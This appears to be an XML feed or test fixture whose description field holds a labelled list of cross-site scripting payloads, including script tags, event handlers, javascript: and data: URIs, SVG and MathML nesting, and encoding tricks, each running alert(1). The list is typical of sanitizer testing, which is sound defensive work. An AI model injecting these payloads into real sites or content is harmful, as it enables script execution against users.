      <description>
        <![CDATA[
        <!-- basic script -->
<script>alert(1)</script>

<!-- svg script -->
<svg><script>alert(1)</script></svg>

<!-- event handlers -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- javascript URL -->
<a href="javascript:alert(1)">click</a>

<!-- encoded javascript -->
<a href="j&#97;vascript:alert(1)">click</a>

<!-- data URI -->
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

<!-- srcdoc -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>

<!-- malformed tag recovery -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- broken attributes -->
<img src=x onerror="&#97;lert(1)">

<!-- nested svg -->
<svg>
  <foreignObject>
    <iframe src="javascript:alert(1)"></iframe>
  </foreignObject>
</svg>

<!-- mathml -->
<math>
  <mtext>
    <img src=x onerror=alert(1)>
  </mtext>
</math>

<!-- object/embed -->
<object data="javascript:alert(1)"></object>
<embed src="javascript:alert(1)">

<!-- meta refresh -->
<meta http-equiv="refresh" content="0;javascript:alert(1)">

<!-- style-based -->
<div style="background:url(javascript:alert(1))"></div>

<!-- unicode obfuscation -->
<img src=x o\u006Eerror=alert(1)>

<!-- xml namespace weirdness -->
<x xmlns:x="http://www.w3.org/1999/xhtml">
  <x:script>alert(1)</x:script>
</x>

<!-- comment breaking -->
